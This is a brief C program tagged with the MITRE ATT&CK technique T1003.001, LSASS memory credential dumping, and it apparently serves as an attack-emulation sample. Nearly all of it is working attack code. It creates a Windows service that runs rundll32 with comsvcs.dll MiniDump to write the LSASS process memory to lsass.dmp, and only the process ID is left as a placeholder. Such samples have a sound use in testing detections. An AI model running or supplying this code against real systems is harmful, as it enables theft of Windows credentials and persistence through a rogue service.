// Link      = https://attack.mitre.org/techniques/T1003/001/
// Technique = OS Credential Dumping: LSASS Memory
// ID        = T1003.001
// Tactics   = Credential Access

#include <windows.h>

#define RUN(toRun) WinExec("sc create MyService binPath= cmd.exe /c " toRun, SW_SHOW);

int main() {
    RUN("rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full");
    return 0;
}